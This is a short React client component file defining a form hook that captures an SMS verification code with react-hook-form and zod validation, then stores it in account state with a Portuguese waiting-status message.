'use client';

import { useForm, SubmitHandler } from 'react-hook-form';

import { zodResolver } from '@hookform/resolvers/zod';

import { useAccountContext } from '../accountContext/useContext';
import { useLoadingContext } from '../loadingContext/useContext';
import { zodSchema, BodyProtocol } from './validation';

export default function useFormCodeSMS() {
  const {
    register,
    handleSubmit,
    setValue,
    watch,
    reset,
    trigger,
    setFocus,
    formState: { errors, isSubmitted },
  } = useForm<BodyProtocol>({
    resolver: zodResolver(zodSchema),
    defaultValues: {
      sms: '',
    },
  });
  const { isLoading, setIsLoading } = useLoadingContext();
  const { setAccount } = useAccountContext();

  const handleFormSubmit: SubmitHandler<BodyProtocol> = async body => {
    if (isLoading) return;
    const { sms } = body;
    setIsLoading(true);
    setAccount(state => ({
      ...state,
      sms,
      status: 'esperando resposta código sms',
    }));
  };

  const handleReset = () => {
    reset();
  };

  return {
    handleSubmit: handleSubmit(handleFormSubmit),
    register,
    setValue,
    watch,
    errors,
    handleReset,
    trigger,
    isSubmitted,
    setFocus,
  };
}
